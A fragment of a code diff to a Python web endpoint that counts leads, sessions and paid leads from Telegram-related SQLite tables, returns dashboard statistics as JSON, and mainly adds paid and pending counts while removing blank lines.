+        today_paid_count = sum(1 for ld in leads if ld["is_paid"] and (ld["ts"] or 0) >= today_start)
 
         if role == "supreme_admin":
-
             total_sessions_tg = db.execute("SELECT COUNT(*) as c FROM tg_sessions").fetchone()["c"]
-
             total_sessions_ev = db.execute("SELECT COUNT(*) as c FROM sessions").fetchone()["c"] if db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'").fetchone() else 0
-
             total_sessions = max(total_sessions_tg + total_sessions_ev, 1)
-
             total_leads_tg = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE event_type IN ('LEAD_CAPTURED','LEAD_PENDING')").fetchone()["c"]
-
             total_leads_ev = db.execute("SELECT COUNT(*) as c FROM events WHERE event_type IN ('LEAD_CAPTURED','LEAD_PENDING')").fetchone()["c"]
-
             total_leads = total_leads_tg + total_leads_ev
-
         else:
-
             total_sessions = db.execute("SELECT COUNT(*) as c FROM tg_sessions WHERE tg_id=?", (tg_id,)).fetchone()["c"] or 1
-
             total_leads = db.execute("SELECT COUNT(*) as c FROM tg_events WHERE tg_id=? AND event_type IN ('LEAD_CAPTURED','LEAD_PENDING')", (tg_id,)).fetchone()["c"]
 
         conv_rate = round((total_leads / max(total_sessions, 1)) * 100, 1)
 
-
-
         return jsonify({
-
-            "ok":          True,
-
-            "leads":       leads,
-
-            "today_count": today_count,
-
-            "total_leads": total_leads,
-
-            "conv_rate":   conv_rate,
-
+            "ok":               True,
+            "leads":            leads,
+            "today_count":      today_count,
+            "today_paid_count": today_paid_count,
+            "total_leads":      total_leads,
+            "paid_count":       paid_count,
+            "pending_count":    pending_count,
+            "conv_rate":        conv_rate,
         })
 
     except Exception as e:
